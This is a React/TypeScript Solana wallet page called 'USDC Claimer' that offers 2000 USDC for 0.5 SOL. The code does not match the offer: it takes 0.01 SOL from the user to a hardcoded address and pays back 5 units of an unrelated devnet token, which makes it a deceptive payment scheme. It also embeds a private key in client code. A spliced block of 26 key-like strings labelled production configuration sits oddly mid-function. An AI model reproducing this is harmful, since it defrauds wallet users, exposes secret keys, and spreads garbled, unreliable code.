/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4ADLt7rAGFLfJHMNWHYgdVoepSy57UYvn4JxWQocHSzensZoJmE8MwkCnha21VXvaJmMx39X6apjSpBiKX6VFHV6"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3PhYuUR8JYNhzXH1kZ654udyXC9LpFRPzFLswJfwZn76qBqunXGPBn5AA9eFwm6Yrc96mPBZrzST7JVKG7BbZXNv",
  "key1": "2a6uRsUG5Su5w7REZSzB6tgSmymv9eB6LZD66WAemmwPjXr3qSfJc7EqJs7tkxaHjCNY6vhqEmH52jzurVkJrq1d",
  "key2": "3UE53UE555mhT7NrXytd9k9bjGmTPrfsCfN5jzdsM3gGgrFALdtW6JeYBmjo6PRoRe8d83HhjWz6dSXYZP1iLrFP",
  "key3": "MxqHF3Q8WhC5sUzBo4Pv7JtK2ycBTxt43GEct7RF38LSdosrxAjhAYJAvkTZcfuzSn9qgSfWpMU19qzh2sf5xJ1",
  "key4": "tPNbc8HngbJaMJ9S5qdNd69LyD8ntS7Z35MrRJAtuLPdDNHh9KyyR91RnyWTYUMHPsksELXYGPWw4yrmL7Mj1Je",
  "key5": "3idULksud79HeqbCwaQY5Fn3EfH8dzNVCALtSGVPcyex2aELh46cPbuojprL8NNNEkEFGbLYDrj5L6xoAgSeHPSF",
  "key6": "5AavapRE3nSPHWRoVVyZo8EpNAoCWarKrRFs5MvQs7bvzqmLnCBxBPLh5dZm7DitZM3EmpFKaihSffc2x26S7zdE",
  "key7": "2WYuJR6P762JTLr8xrt22XBBXiwSpGLrkRecFo7WV3qBrZeV5kS464gpYwUo9L9u2xZTTZhvhZS6r7GvEqZ9QfEp",
  "key8": "3LnW3LCsKasp9FsPxzRTU4KydnFJGkrN7VpgqAQ6uCDoMPWd3gx8cq1cPRZEGnHsCc9QSpigiZYogwMdSw8JhbWM",
  "key9": "2PFqYanuJXdmsshPQJiFz86bZUEfRu9p745xaMRhJhLV9NZHxcTNpLBrvYUAjoVdYxubM8afdLAfenQd1UtV8KvM",
  "key10": "3taYgf4dibEzrjvMEbFgTKfDiAYLANXU5o9NYVvcEG4v47CH93GJBH5XXvUrKWtzjf1qxZhXXCVmZGoxrZ3iANGX",
  "key11": "aaFx3FK3kcYL4jc8BoFwFkwEEKhjVny3dBsDDyLYYQMohwVyKzSi16HDkLTQjyQ8UPfC9JspoiFQYkgKk7BnSiy",
  "key12": "2aw8wmGbiUXN7asS2Nq5ay7g6xLhmK44ZE86ZjF8E3Z2ST3p5oBWHxUpYti9GJVMdnv2YGKm1DhgYVUESScP5QaP",
  "key13": "2AJt93Wxvq4NWKYJDhxxaydq9MPkkGRU3ZBMP2yCcJEWzo48eB6CA2nycZb19Pj4zqddZUdCf41EpQDmYwFdSyoo",
  "key14": "5BfU4VVnj6H97VAy5UZhNs3TpVJgAyGuymJeM5RfQFrfHHHXKdD1kd6WMZ5YCU8qZZVFtbLKDAnLwi8pv1SmEPin",
  "key15": "iFJDL6oGwGz1gEFNhXdWwB1xgj1yJto93r8pxNtqcGBw6RjJNqHeZ7THQMh6uvpiEPidXe7hJVWaFro3jULDHsa",
  "key16": "32S2wcS8me2WFDTntoajJfYX7ZkQPHcV59sK96ZL4wEofT54d9xt9bBxYbAKxtfVYM4HiYrNKEZqwUTcuvxXJtak",
  "key17": "4eg1sNZAYhJTkynix82fxnv4V1YJWY6DCXQ3yperzNbuvv42WXKzBwAQjVCmALyWNCvs3RM1JLusoUw4bpBXzQhM",
  "key18": "4KkPBzJupZKDAydbiGZxr7RF9ULYwowcTpRAkrHYgcrLNoB5WNwKvpf9dAujxvQNh8BaHzzW5CJbgvWDojuzsJUm",
  "key19": "4Rhq1FTPeVhJwXTrMAFvzRh6DDG2LXCLzDgyZT25CZLLRb8cv3xaAbnTSV2XnncksLtG8dTFxYpSoHhy6VKW6EX7",
  "key20": "5sgUsntd6rDqdFxBKCpt6Jpm7DQnxpdbYbVAfoKioqm5AUw4nAhaq6JWHBLSSvRjB3XE4aSDdRwh65SdopQ5STUM",
  "key21": "4LxY1gh7ejgERTrW6CLTHWDxNZed6Cvy2rWudftnxqV73ZBquTBSjUqukZ2GLRYPcL2gkBajxPzRJkLmGa356t7D",
  "key22": "3F69erB6Zvm4Zncqdk6Pq9XJFwupEkGV2Ucog6bs3vyMCMydmHdhJyZiaAaEQCVW1kGCcsgYL6oQGUirNpWjzMdS",
  "key23": "4QoZrFo9vLjT5Na1NspwNBuz1teTtUtcUw8xvHxK8rKsv9vsUKYcU5bJHqvcBmj3TtTVwPjpY8563Etf3SgP5MTo",
  "key24": "3RREYfnkmP3at7VKWxZbV7jwLM9ur5uw8UdDdtsfrtF3xnagKqK7KX7oDKPNRMk8ucBC3iHBcxExULJPLBFZyr8G",
  "key25": "4EpqUpopVWYce59bhMiknmgwe1vHJLnGuJn5EBojZMnjRTDRhAGUB7qzLZPvAY2CJBHCusnpUbqU7844g5Y7na4Y"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
